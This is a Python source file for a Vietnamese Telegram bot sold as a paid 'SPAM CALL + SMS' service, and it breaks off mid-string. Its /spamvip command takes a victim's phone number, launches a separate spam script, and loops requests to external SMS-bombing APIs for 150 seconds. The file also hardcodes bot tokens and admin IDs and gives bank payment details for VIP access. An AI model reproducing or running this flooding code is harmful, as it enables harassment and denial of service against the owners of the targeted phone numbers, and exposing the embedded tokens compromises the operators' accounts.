import telebot
import os
import subprocess
import time
import datetime
import time
import os,sys,re
import subprocess
import requests
import datetime
import datetime
import sqlite3
import psutil
import hashlib
import random
import json
import socket
import logging
import sys
from bs4 import BeautifulSoup
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib.parse import urlparse
import threading
from io import BytesIO
import requests
import socket
import cohere
from time import strftime
from telebot import types
from gtts import gTTS
import tempfile
from telegram.ext import CallbackContext
from telegram import Update, ChatMember
import qrcode
import sqlite3
from telebot import TeleBot
from PIL import Image
from datetime import date
from datetime import datetime
from datetime import datetime as dt
from concurrent.futures import ThreadPoolExecutor
from telebot import apihelper
from telebot.types import Message
from collections import Counter


# K√≠ch ho·∫°t middleware
apihelper.ENABLE_MIDDLEWARE = True
# Configuration Variables
admins = ["Ngocdoian"]  # Admin username without '@'
name_bot = "VuThiHoa"       # Bot name
zalo = "https://tinyurl.com/2y79qkkp"        # Contact info


#bot ch√≠nh: 7233629917:AAECbyze0wXlYBVkIE1EX8CBm4sHxaexHjg
#bot ph·ª•: 7263955371:AAHkl6syD_cLbMQISw1cw-GOmPNWG-UMBrk
# Bot Token
bot = telebot.TeleBot("7233629917:AAECbyze0wXlYBVkIE1EX8CBm4sHxaexHjg")  # Token bot
# Initialization Message
print("Bot ƒë√£ ƒë∆∞·ª£c kh·ªüi ƒë·ªông th√†nh c√¥ng")
cooldowns = {}
# Admin Usernames and IDs
ADMIN_ID = {6033886040, 6620239777}   # List of admin ID

# H√†m ki·ªÉm tra quy·ªÅn admin
def is_admin(message):
    user_id = message.from_user.id  # ID ng∆∞·ªùi d√πng (ki·ªÉu int)
    print(f"üîç Ki·ªÉm tra quy·ªÅn admin cho ID: {user_id}")  # Debug
    print(f"üìã Danh s√°ch admin: {ADMIN_ID}")  # Debug

    if user_id in ADMIN_ID:
        print("‚úÖ Ng∆∞·ªùi d√πng n√†y l√† admin!")
        return True
    else:
        print("‚ùå Ng∆∞·ªùi d√πng n√†y kh√¥ng c√≥ quy·ªÅn admin!")
        return False
    
# Variables for Bot Functionality
lan = {}
notifi = {}
auto_spam_active = False
last_sms_time = {}
allowed_users = []
processes = []
last_command_time = {}
user_state = {}
conversation_history = {}
sent_messages = []  # Khai b√°o bi·∫øn l√† m·ªôt danh s√°ch r·ªóng

# Database Connection
connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# API Configuration
BASE_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent'

def check_command_cooldown(user_id, command, cooldown):
    current_time = time.time()
    
    if user_id in last_command_time and current_time - last_command_time[user_id].get(command, 0) < cooldown:
        remaining_time = int(cooldown - (current_time - last_command_time[user_id].get(command, 0)))
        return remaining_time
    else:
        last_command_time.setdefault(user_id, {})[command] = current_time
        return None

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now


def load_users_from_database():
  cursor.execute('SELECT user_id, expiration_time FROM users')
  rows = cursor.fetchall()
  for row in rows:
    user_id = row[0]
    expiration_time = datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
    if expiration_time > datetime.now():
      allowed_users.append(user_id)

# Danh s√°ch ID nh√≥m ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng bot
# ID box ch√≠nh: -1002281816867
# ID box ph·ª•: -1002345897140
ALLOWED_GROUP_IDS = [-1002281816867]  # Thay b·∫±ng ID nh√≥m c·ªßa b·∫°n

# Danh s√°ch ID admin ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng bot qua tin nh·∫Øn ri√™ng
ALLOWED_ADMIN_IDS = [6620239777, 6033886040]  # Thay b·∫±ng ID admin c·ªßa b·∫°n


# H√†m ki·ªÉm tra quy·ªÅn
def check_access(message):
    if message.chat.type == "private":  # Tin nh·∫Øn ri√™ng
        if message.from_user.id not in ALLOWED_ADMIN_IDS:
            bot.reply_to(message, "‚ùå Bot ch·ªâ h·ªó tr·ª£ trong nh√≥m https://t.me/BoxTienIch.")
            return False
    elif message.chat.type in ["group", "supergroup"]:  # Tin nh·∫Øn trong nh√≥m
        if message.chat.id not in ALLOWED_GROUP_IDS:
            bot.reply_to(message, "‚ùå Bot ch·ªâ ho·∫°t ƒë·ªông trong nh√≥m https://t.me/BoxTienIch.")
            return False
    else:
        bot.reply_to(message, "‚ùå Bot kh√¥ng h·ªó tr·ª£ trong lo·∫°i chat n√†y.")
        return False
    return True
def save_user_to_database(connection, user_id, expiration_time):
  cursor = connection.cursor()
  cursor.execute(
    '''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
  connection.commit()

# Ki·ªÉm tra v√† t·∫°o th∆∞ m·ª•c VIP
if not os.path.exists("./vip"):
    os.makedirs("./vip")

if not os.path.exists("./reg_VIP.txt"):
    open("./reg_VIP.txt", "w").close()

# L·ªánh /add reg ho·∫∑c /add spam: Th√™m th√¥ng tin VIP ho·∫∑c reg
@bot.message_handler(commands=['add'])
def add_vip_or_reg(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(
            message,
            '‚ùå Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p:\n'
            '/add spam <UID> <Ng√†y h·∫øt h·∫°n vd:(31-12-2xxx)> <S·ªë l·∫ßn>\n'
            'ho·∫∑c\n/add reg <UID> <S·ªë l·∫ßn>.'
        )
        return

    command_type = parts[1]
    uid = parts[2]

    if command_type == "spam":  # Th√™m VIP
        if len(parts) != 5:
            bot.reply_to(message, '‚ùå Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p: /add spam <UID> <Ng√†y h·∫øt h·∫°n vd:(31-12-2xxx)> <S·ªë l·∫ßn>.')
            return

        expiration_date = parts[3]
        usage_limit = parts[4]

        try:
            expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
        except ValueError:
            bot.reply_to(message, '‚ùå Ng√†y kh√¥ng h·ª£p l·ªá. Vui l√≤ng s·ª≠ d·ª•ng ƒë·ªãnh d·∫°ng vd:(31-12-2xxx).')
            return

        # L∆∞u th√¥ng tin VIP v√†o file
        with open(f"./vip/{uid}.txt", "w") as file:
            file.write(f"{expiration_date}|{usage_limit}")

        bot.reply_to(message, f'‚úÖ ƒê√£ th√™m VIP cho UID {uid}:\n- Ng√†y h·∫øt h·∫°n: {expiration_date}\n- S·ªë l·∫ßn s·ª≠ d·ª•ng: {usage_limit}')

    elif command_type == "reg":  # Th√™m quy·ªÅn /regvip
        if len(parts) != 4:
            bot.reply_to(message, '‚ùå Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p: /add reg <UID> <S·ªë l·∫ßn>.')
            return

        usage_limit = parts[3]

        # ƒê·ªçc n·ªôi dung file reg_VIP.txt
        with open("./reg_VIP.txt", "r") as file:
            lines = file.readlines()

        # C·∫≠p nh·∫≠t ho·∫∑c th√™m m·ªõi UID
        updated_lines = []
        replaced = False
        for line in lines:
            if line.startswith(uid + "|"):  # T√¨m d√≤ng tr√πng UID
                updated_lines.append(f"{uid}|{usage_limit}\n")
                replaced = True
            else:
                updated_lines.append(line)

        # N·∫øu kh√¥ng t√¨m th·∫•y UID, th√™m m·ªõi
        if not replaced:
            updated_lines.append(f"{uid}|{usage_limit}\n")

        # Ghi l·∫°i v√†o file
        with open("./reg_VIP.txt", "w") as file:
            file.writelines(updated_lines)

        if replaced:
            bot.reply_to(message, f'‚úÖ ƒê√£ c·∫≠p nh·∫≠t quy·ªÅn s·ª≠ d·ª•ng l·ªánh /regvip cho UID {uid} v·ªõi s·ªë l·∫ßn: {usage_limit}')
        else:
            bot.reply_to(message, f'‚úÖ ƒê√£ th√™m quy·ªÅn s·ª≠ d·ª•ng l·ªánh /regvip cho UID {uid} v·ªõi s·ªë l·∫ßn: {usage_limit}')

    else:
        bot.reply_to(message, '‚ùå L·ªánh kh√¥ng h·ª£p l·ªá. H√£y d√πng /add spam ho·∫∑c /add reg.')

@bot.message_handler(commands=['reset_user'])
def reset_user(message):
    if not is_admin(message):  # Ki·ªÉm tra quy·ªÅn admin
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    # ƒê∆∞·ªùng d·∫´n ƒë·∫øn th∆∞ m·ª•c user
    user_directory = './user'

    # Ki·ªÉm tra n·∫øu th∆∞ m·ª•c user t·ªìn t·∫°i
    if not os.path.exists(user_directory):
        bot.reply_to(message, 'Kh√¥ng t√¨m th·∫•y th∆∞ m·ª•c ch·ª©a d·ªØ li·ªáu ng∆∞·ªùi d√πng.')
        return

    # Duy·ªát qua c√°c th∆∞ m·ª•c t·ª´ 1 ƒë·∫øn 31
    for day in range(1, 32):
        day_directory = os.path.join(user_directory, str(day))
        if os.path.exists(day_directory):  # N·∫øu th∆∞ m·ª•c ng√†y ƒë√≥ t·ªìn t·∫°i
            # Duy·ªát qua t·∫•t c·∫£ c√°c t·ªáp trong th∆∞ m·ª•c ng√†y ƒë√≥ v√† x√≥a c√°c t·ªáp .txt
            for filename in os.listdir(day_directory):
                file_path = os.path.join(day_directory, filename)
                if os.path.isfile(file_path) and filename.endswith('.txt'):
                    os.remove(file_path)  # X√≥a t·ªáp .txt

            # N·∫øu b·∫°n mu·ªën x√≥a c·∫£ th∆∞ m·ª•c sau khi x√≥a c√°c t·ªáp .txt, d√πng shutil.rmtree:
            # shutil.rmtree(day_directory)
    
    # X√≥a t·∫•t c·∫£ c√°c t·ªáp .txt trong th∆∞ m·ª•c user (kh√¥ng theo ng√†y)
    for filename in os.listdir(user_directory):
        file_path = os.path.join(user_directory, filename)
        if os.path.isfile(file_path) and filename.endswith('.txt'):
            os.remove(file_path)  # X√≥a t·ªáp .txt
    
    bot.reply_to(message, "T·∫•t c·∫£ c√°c t·ªáp d·ªØ li·ªáu ng∆∞·ªùi d√πng ƒë√£ ƒë∆∞·ª£c reset.")

# T·∫°o t·ª´ ƒëi·ªÉn ƒë·ªÉ l∆∞u th·ªùi gian spam cu·ªëi c√πng c·ªßa m·ªói ng∆∞·ªùi d√πng
cooldown_dict = {}
processes = []

name_bot = "SpamBot"  # T√™n bot c·ªßa b·∫°n (thay ƒë·ªïi t√πy √Ω)

# H√†m x·ª≠ l√Ω l·ªánh /spamvip
video_url = "https://files.catbox.moe/2vx7k6.mp4"

@bot.message_handler(commands=['spamvip'])
def spamvip(message):
    user_id = message.from_user.id
    username = message.from_user.username or "·∫®n danh"
    vip_file_path = f"./vip/{user_id}.txt"

    if not os.path.exists(vip_file_path):
        bot.reply_to(message, 'Th√¥ng tin VIP kh√¥ng h·ª£p l·ªá. Vui l√≤ng li√™n h·ªá admin.')
        return

    with open(vip_file_path) as fo:
        data = fo.read().split("|")

    try:
        expiration_date = data[0]
        expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
    except (ValueError, IndexError):
        bot.reply_to(message, 'Th√¥ng tin VIP kh√¥ng h·ª£p l·ªá. Vui l√≤ng li√™n h·ªá admin.')
        return

    today = date.today()
    if today > expiration_date_obj:
        bot.reply_to(message, 'Key VIP ƒë√£ h·∫øt h·∫°n. Vui l√≤ng li√™n h·ªá admin.')
        os.remove(vip_file_path)
        return

    try:
        _, phone_number, lap = message.text.split()
    except ValueError:
        bot.reply_to(message, "Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p: /spamvip <s·ªë ƒëi·ªán tho·∫°i> <s·ªë l·∫ßn spam>")
        return

    if not lap.isnumeric() or not (1 <= int(lap) <= 10):
        bot.reply_to(message, "Vui l√≤ng ch·ªçn s·ªë l·∫ßn spam trong kho·∫£ng t·ª´ 1 ƒë·∫øn 10.")
        return

    if phone_number in ["0985237602", "0326274360", "0339946702"]:
        bot.reply_to(message, "Kh√¥ng th·ªÉ spam s·ªë ADMIN. H√†nh ƒë·ªông b·ªã c·∫•m.")
        return

    current_time = datetime.now()
    if username in cooldown_dict and 'spam' in cooldown_dict[username]:
        last_time = cooldown_dict[username]['spam']
        time_elapsed = (current_time - last_time).total_seconds()
        cooldown = 60
        if time_elapsed < cooldown:
            bot.reply_to(
                message,
                f"‚è≥ Vui l√≤ng ƒë·ª£i {cooldown - int(time_elapsed)} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·ªánh n√†y ti·∫øp."
            )
            return

    cooldown_dict[username] = {'spam': current_time}

    # Ch·∫°y file smsv2.py
    file_path = os.path.join(os.getcwd(), "smsv2.py")
    process = subprocess.Popen(["python3", file_path, phone_number, str(lap)])
    processes.append(process)

    # G·ªçi API spam SMS
    url1 = f"http://160.191.245.126:5000/vsteam/api?key=tmrvirus-free&sdt={phone_number}"
    url2 = f"https://api.natnetwork.sbs/spamsms?phone={phone_number}&count=10"
    threading.Thread(target=spam_sms, args=(phone_number, url1, url2)).start()

    message_text = (f'''
> ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚≠ì SPAM VIP ‚≠ì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
> ‚îÇ¬ª User: @{username} ƒë√£ g·ª≠i spam                      
> ‚îÇ¬ª Spam: Th√†nh C√¥ng [‚úì]
> ‚îÇ¬ª User: VIP PLAN
> ‚îÇ¬ª Attacking: {phone_number}
> ‚îÇ¬ª Admin: Ngocdoian 
> ‚îÇ¬ª S·ªë l·∫ßn: {lap}
> ‚îÇ¬ª Telegram Admin: @Ngocdoian
> ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[‚úì]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    ''')
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')

def spam_sms(phone, url1, url2):
    start_time = time.time()
    end_time = start_time + 150
    while time.time() < end_time:
        try:
            requests.get(url1, timeout=10)
            requests.get(url2, timeout=10)
        except requests.exceptions.RequestException:
            pass

# L·ªánh d·ª´ng spam
@bot.message_handler(commands=['stop_spam'])
def stopspam(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    user_id = message.from_user.id

    # Ki·ªÉm tra xem ng∆∞·ªùi d√πng c√≥ ti·∫øn tr√¨nh n√†o ƒëang ch·∫°y kh√¥ng
    if not processes:
        bot.reply_to(message, "Kh√¥ng c√≥ ti·∫øn tr√¨nh spam n√†o ƒëang ch·∫°y.")
        return

    # D·ª´ng t·∫•t c·∫£ c√°c ti·∫øn tr√¨nh ƒëang ch·∫°y
    stopped_count = 0
    for process in processes:
        # Ki·ªÉm tra n·∫øu ti·∫øn tr√¨nh v·∫´n ƒëang ch·∫°y
        if process.poll() is None:  # N·∫øu ti·∫øn tr√¨nh v·∫´n ƒëang ch·∫°y
            process.terminate()  # D·ª´ng ti·∫øn tr√¨nh
            stopped_count += 1

    # X√≥a c√°c ti·∫øn tr√¨nh kh·ªèi danh s√°ch sau khi ƒë√£ d·ª´ng
    processes.clear()  # X√≥a t·∫•t c·∫£ ti·∫øn tr√¨nh

    if stopped_count > 0:
        bot.reply_to(message, f"ƒê√£ d·ª´ng t·∫•t c·∫£ ti·∫øn tr√¨nh spam c·ªßa b·∫°n.")
    else:
        bot.reply_to(message, "Kh√¥ng c√≥ ti·∫øn tr√¨nh spam n√†o c·∫ßn d·ª´ng.")

# L·ªánh check th·ªùi gian s·ª≠ d·ª•ng VIP c√≤n l·∫°i
@bot.message_handler(commands=['check_vip'])
def check_vip(message):
    user_id = message.from_user.id
    vip_file_path = f"./vip/{user_id}.txt"
    
    # Ki·ªÉm tra xem ng∆∞·ªùi d√πng c√≥ file VIP kh√¥ng
    if not os.path.exists(vip_file_path):
        bot.reply_to(message, 'B·∫°n ch∆∞a ƒëƒÉng k√Ω VIP. Vui l√≤ng li√™n h·ªá admin ƒë·ªÉ ƒëƒÉng k√Ω.')
        return
    
    # ƒê·ªçc d·ªØ li·ªáu t·ª´ file VIP
    with open(vip_file_path, 'r') as file:
        data = file.read().strip()

    # T√°ch ng√†y h·∫øt h·∫°n v√† s·ªë ng√†y b·∫±ng d·∫•u "|"
    try:
        expiration_date, expiration_days = data.split('|')
        expiration_date_obj = datetime.strptime(expiration_date, '%d-%m-%Y').date()
        expiration_days = int(expiration_days)
    except ValueError:
        bot.reply_to(message, 'D·ªØ li·ªáu VIP kh√¥ng h·ª£p l·ªá. Vui l√≤ng li√™n h·ªá admin.')
        return
    
    # Ki·ªÉm tra xem key VIP ƒë√£ h·∫øt h·∫°n ch∆∞a
    today = date.today()
    if today > expiration_date_obj:
        bot.reply_to(message, 'Key VIP c·ªßa b·∫°n ƒë√£ h·∫øt h·∫°n. Vui l√≤ng li√™n h·ªá admin ƒë·ªÉ gia h·∫°n.')
        os.remove(vip_file_path)  # X√≥a file VIP n·∫øu h·∫øt h·∫°n
        return

    # T√≠nh to√°n s·ªë ng√†y c√≤n l·∫°i
    remaining_days = (expiration_date_obj - today).days
    bot.reply_to(message, f"Key VIP c·ªßa b·∫°n c√≤n {remaining_days} ng√†y n·ªØa.\nNg√†y h·∫øt h·∫°n: {expiration_date_obj.strftime('%d-%m-%Y')}")

@bot.message_handler(commands=['huyvip'])
def remove_vip(message):
    if not is_admin(message):
        bot.reply_to(message, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Xin cung c·∫•p ID ng∆∞·ªùi d√πng ƒë·ªÉ hu·ª∑ quy·ªÅn VIP.')
        return

    user_id = int(message.text.split()[1])
    # X√≥a VIP trong file
    vip_file_path = f"./vip/{user_id}.txt"
    if os.path.exists(vip_file_path):
        os.remove(vip_file_path)
        bot.reply_to(message, f'Ng∆∞·ªùi d√πng {user_id} ƒë√£ b·ªã hu·ª∑ quy·ªÅn VIP th√†nh c√¥ng.')
    else:
        bot.reply_to(message, f'Ng∆∞·ªùi d√πng {user_id} kh√¥ng ph·∫£i l√† VIP.')

start_time = time.time()  # Ghi l·∫°i th·ªùi gian b·∫Øt ƒë·∫ßu

def get_elapsed_time():
    elapsed_time = time.time() - start_time  # T√≠nh th·ªùi gian ƒë√£ tr√¥i qua
    return elapsed_time

users_keys = {}  # Khai b√°o users_keys n·∫øu ch∆∞a c√≥

# H√†m ki·ªÉm tra key
def is_key_approved(chat_id, key):
    if chat_id in users_keys:
        user_key, timestamp = users_keys[chat_id]
        if user_key == key:
            current_time = datetime.datetime.now()
            if current_time - timestamp <= datetime.timedelta(hours=2):
                return True
            else:
                del users_keys[chat_id]
    return False

# H√†m escape_markdown ƒë√£ s·ª≠a
def escape_markdown(text):
    """Tho√°t c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát ƒë·ªÉ s·ª≠ d·ª•ng trong ch·∫ø ƒë·ªô MarkdownV2"""
    if text is None:
        text = "unknown_user"  # G√°n gi√° tr·ªã m·∫∑c ƒë·ªãnh n·∫øu username l√† None
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in escape_chars else char for char in text)
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    user_id = message.from_user.id  # L·∫•y ID c·ªßa ng∆∞·ªùi d√πng g·ª≠i tin nh·∫Øn

    # Ki·ªÉm tra n·∫øu ID ng∆∞·ªùi d√πng ch∆∞a c√≥ trong file th√¨ ghi v√†o
    with open('id', 'r') as file:
        if str(user_id) not in file.read():  # Ch·ªâ ki·ªÉm tra ID ng∆∞·ªùi d√πng, kh√¥ng ph·∫£i ID nh√≥m
            with open('id', 'a') as file:
                file.write(str(user_id) + '\n')  # L∆∞u ID ng∆∞·ªùi d√πng v√†o file

    username = escape_markdown(message.from_user.username)
    xinchao = f"""<blockquote> üöÄüìñ‚≠êBOT SPAM CALL + SMS‚≠êüìñüöÄ </blockquote>
<b>[‚≠ê] Xin ch√†o @{username}</b> 
<blockquote expandable>üìñ T·∫•t c·∫£ l·ªánh d√†nh cho ng∆∞·ªùi d√πng
üìù Danh S√°ch L·ªánh Bot:
üìã /start - Xem Danh S√°ch L·ªánh
üõ†Ô∏è /admin - Th√¥ng Tin Admin
Vip Vip
üîë /getkey_spam - ƒê·ªÉ L·∫•y Key spam
üîë /key_spam - Nh·∫≠p Key V√† X√†i Spam
üö® /spam - Spam SMS
üéóÔ∏è /muavip - ƒê·ªÉ ƒëc x√†i l·ªánh spamvip
L·ªánh Reg UGphone üëΩ
üëæ /REG - Show T·∫•t C·∫£ L·ªánh Reg
L·∫•y QR VƒÉn B·∫£n
üîé /qr - Chuy·ªÉn VƒÉn B·∫£n Th√†nh QR
L·∫•y Th√¥ng Tin
üîé /down - T·∫£i Video B·∫±ng Link
üîé /info - Th√¥ng Tin Tele
üîé /getid - ƒê·ªÉ L·∫•y ID fb
üîé /fb - B·∫¢O TR√å
üîé /avtfb - L·∫•y AVT FB Xuy√™n Khi√™n
üîé /capcut - L·∫•y Th√¥ng Tin CAPCUT
·∫¢nh ƒê·∫πp G√°i Xinh
üë©‚Äçüé§ /gai - ·∫¢nh G√°i xinh and sexy
üé• /anime - ·∫¢nh Anime
Ti·ªán √çch
üîâ /voice - VƒÉn b·∫£n th√†nh gi·ªçng n√≥i
üéüÔ∏è /html - Code Web
üåê /check - Th√¥ng Tin Web
üì° /checkip - Check IP
üö® /vi_pham - Check Ph·∫°t Ngu·ªôi
‚è≥ /time - Th·ªùi gian ho·∫°t ƒë·ªông
üéóÔ∏è /bank-/muavip - ƒê·ªÉ Mua VIP 
üèÜ L·ªánh cho key VIP: /lenh_VIP
·ª¶ng H·ªô Admin ƒê·ªÉ C√≥ VPS X·ªãn.</blockquote>"""

    # T·∫°o c√°c n√∫t n·∫±m ngang
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("üë§ Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("ü§ñ Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://files.catbox.moe/xbgx14.mp4"
    bot.send_video(message.chat.id, video_url, caption=xinchao, parse_mode='HTML', reply_markup=keyboard)

# H√†m l·∫•y Facebook ID t·ª´ API
def get_facebook_id(link: str) -> str:
    api_url = f"https://api.sumiproject.net/facebook/uid?link={link}"
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        return data.get('id', 'Kh√¥ng t√¨m th·∫•y ID')
    else:
        return f"L·ªói API: {response.status_code}"
    
start_time = time.time()  # Ghi l·∫°i th·ªùi gian b·∫Øt ƒë·∫ßu

def get_elapsed_time():
    elapsed_time = time.time() - start_time  # T√≠nh th·ªùi gian ƒë√£ tr√¥i qua
    return elapsed_time

@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} gi·ªù, {minutes} ph√∫t, {seconds} gi√¢y'
    bot.reply_to(message, f'Bot ƒê√£ Ho·∫°t ƒê·ªông ƒê∆∞·ª£c: {uptime_str}') 

@bot.message_handler(commands=['lenh_VIP'])
def send_welcome(message):
    username = message.from_user.username
    lenhvip = f"""<blockquote> üöÄüìñ‚≠êBOT SPAM CALL + SMS‚≠êüìñüöÄ </blockquote>
<b>[‚≠ê] Xin ch√†o @{username}</b> 
<blockquote expandable>üìñ T·∫•t C·∫£ c√¢u l·ªánh d√†nh cho ADM
Ô∏èü•àL·ªánh Cho VIP
¬ª /spamvip: Spam call si√™u nhi·ªÅu
¬ª /check_vip: ƒê·ªÉ check th·ªùi gian VIP c·ªßa m√¨nh
¬ª hi·ªán t·∫°i th√¨ ch∆∞a th√™m v√†i ch·ª©c nƒÉng n√™n l√† x√†i t·∫°m nhe !
</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("üë§ Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("ü§ñ Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhvip, parse_mode='HTML', reply_markup=keyboard)


@bot.message_handler(commands=['lenh_ADM'])
def send_welcome(message):
    username = message.from_user.username
    lenhadmin = f"""<blockquote> üöÄüìñ‚≠êBOT SPAM CALL + SMS‚≠êüìñüöÄ </blockquote>
<b>[‚≠ê] Xin ch√†o @{username}</b> 
<blockquote expandable>üìñ T·∫•t C·∫£ c√¢u l·ªánh d√†nh cho ADM
üî∞L·ªánh Cho Admin
¬ª /cpu: ƒê·ªÉ xem c·∫•u h√¨nh
¬ª /restart: ƒê·ªÉ kh·ªüi ƒë·ªông l·∫°i bot
¬ª /stop: (‚ö†Ô∏èL∆∞u √Ω‚ö†Ô∏è x√†i l√† t·∫Øt lu√¥n)
¬ª /all: ƒê·ªÉ th√¥ng b√°o cho c·∫£ nh√≥m
¬ª /huyvip: ƒê·ªÉ h·ªßy vip b·∫±ng id
¬ª /stop_spam: ƒê·ªÉ stop spam sms l·∫°i
¬ª /im: ƒê·ªÉ kh√≥a m√µm 
¬ª /unim: ƒê·ªÉ m·ªü kh√≥a m√µm
¬ª /add: ƒê·ªÉ th√™m ng∆∞·ªùi d√πng v√†o vip
¬ª /lock: ƒê·ªÉ kh√≥a chat
¬ª /unlock: ƒê·ªÉ m·ªü chat
¬ª /reset_user: ƒê·ªÉ reset file user
¬ª /id_you: ƒê·ªÉ l·∫•y id ng∆∞·ªùi kh√°c
¬ª /ban: ƒê·ªÉ kick ng∆∞·ªùi d√πng</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("üë§ Admin", url="https://t.me/Ngocdoian"),
        types.InlineKeyboardButton("ü§ñ Bot", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhadmin, parse_mode='HTML', reply_markup=keyboard)
    
@bot.message_handler(commands=['REG'])
def regug(message):
    username = message.from_user.username
    lenhvip = f"""<blockquote> üöÄüìñ‚≠êBOT SPAM CALL + SMS‚≠êüìñüöÄ </blockquote>
<b>[‚≠ê] Xin ch√†o @{username}</b> 
<blockquote expandable>üìñ T·∫•t C·∫£ c√¢u l·ªánh REG
Ô∏èüí©L·ªánh REG
üö® /reg - Reg Mail ƒê·ªÉ X√†i UGphone
üö® /reg1 - L·ªánh Reg D·ª± Ph√≤ng
üö® /regvip - Plan VIP KH√¥ng C·∫ßn V∆∞·ª£t Link
üîë /getkey_reg - T·∫°o Link Key 
üîë /key_reg - L·ªánh ƒê·ªÉ Nh·∫≠p Key (vd: /key_reg 123 )
!!! L∆∞u √Ω !!! Nh·ªõ ƒë·ªÉ √Ω l·ªánh /getkey v·ªõi l·ªánh /getkey_reg l√† 2 l·ªánh kh√°c nhau nh√©
ƒê√¢y L√† C√°ch X√†i reg mail: https://t.me/BoxTienIch/5593
¬ª hi·ªán t·∫°i th√¨ ch∆∞a th√™m v√†i ch·ª©c nƒÉng n√™n l√† x√†i t·∫°m nhe !
</blockquote>"""
        
    keyboard = types.InlineKeyboardMarkup(row_width=2)  
    keyboard.add(
        types.InlineKeyboardButton("ü§ñ Nh·∫Øn Cho Bot ·ªû ƒê√¢y", url="https://t.me/VuThiHoa_bot")
    )

    video_url = "https://imgur.com/SFIAM1t.mp4"
    bot.send_video(message.chat.id, video_url, caption=lenhvip, parse_mode='HTML', reply_markup=keyboard)


@bot.message_handler(commands=['muavip'])
def send_welcome(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    user_id = message.from_user.id
    with open('id', 'r') as file:
        if str(message.chat.id) not in file.read():
            with open('id', 'a') as file:
                file.write(str(message.chat.id) + '\n')
    username = escape_markdown(message.from_user.username)
    xinchao = f"""     ‚≠ì {escape_markdown(name_bot)} ‚≠ì
¬ª Xin ch√†o @{username}
¬ª /bank: Bank ti·ªÅn
"""
    video_url = "https://files.catbox.moe/yaztwg.mp4"
    bot.send_video(message.chat.id, video_url, caption=xinchao, parse_mode='MarkdownV2')
@bot.message_handler(commands=['bank'])
def handle_bank(message):
    if not check_access(message):  # Ki·ªÉm tra quy·ªÅn
        return
    markup = types.InlineKeyboardMarkup()
    btn_MB = types.InlineKeyboardButton(text='MB', callback_data='MB')
    markup.add(btn_MB)
    bot.reply_to(message, "Vui L√≤ng Ch·ªçn Bank:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ['MB'])
def handle_bank_selection(call):
    user_id = call.from_user.id
    if call.data == 'MB':
        qr_code_url = f"https://img.vietqr.io/image/MB-953899999-print.jpg?amount=30000&addInfo=napvip_{user_id}&accountName=THE-NGOC"
        caption = f"""
> ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚≠ì MB BANK ‚≠ì‚îÄ‚îÄ‚îÄ‚îÄ
> ‚îú Ng√¢n H√†ng: MB BANK
> ‚îú STK: 953899999
> ‚îú T√™n: THE NGOC
